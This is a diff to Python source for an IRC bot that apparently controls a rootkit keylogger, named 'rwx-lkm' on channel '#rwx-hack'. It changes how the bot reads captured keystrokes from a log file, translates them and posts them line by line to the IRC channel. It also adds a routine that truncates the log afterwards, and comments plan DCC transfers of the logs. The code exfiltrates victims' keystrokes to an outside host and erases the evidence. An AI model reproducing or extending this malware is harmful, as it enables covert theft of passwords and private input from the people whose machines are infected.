@@ -29,7 +29,7 @@ Bot commands are:
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
-from os import getpid
+from os import getpid, remove
 
 import key
 
@@ -38,7 +38,7 @@ port = 6667
 channel = "#rwx-hack"
 nickname = "rwx-lkm"
 
-# Debug Mode -- set to False to remove.
+# Debug Mode 
 debug = True 
 
 class Bot(irc.bot.SingleServerIRCBot):
@@ -97,16 +97,19 @@ class Bot(irc.bot.SingleServerIRCBot):
                 return s
         return
 
-    # Translate and print the keylog to console. Once finished, deletes file.
+    # Translate and print the keylog to console.
     def keylogs(self):
         evlog = '/opt/col_log/evlog.txt'
         log = open(evlog, 'rw+')
         f = log.read()
         kl = key.translate(f)
-        log.truncate()
         # MUST ADD DCC SEND BEFORE DELETING!!!!!
         log.close()
         return kl
+
+    def trunc_keylogs(self):
+	f = open('/opt/col_log/evlog.txt', 'w')
+	f.truncate()
 
     def error_log(self):
         # SEND ERROR LOG VIA DCC THEN DELETE
@@ -199,6 +202,7 @@ ms -- Show the root module.
        	    c.notice(channel, line)
             if debug:
             	print "%s" % line
+	self.trunc_keylogs()
 
     def _cmd_dcc(self, c, e, cmd, nick):
         dcc = self.dcc_listen()
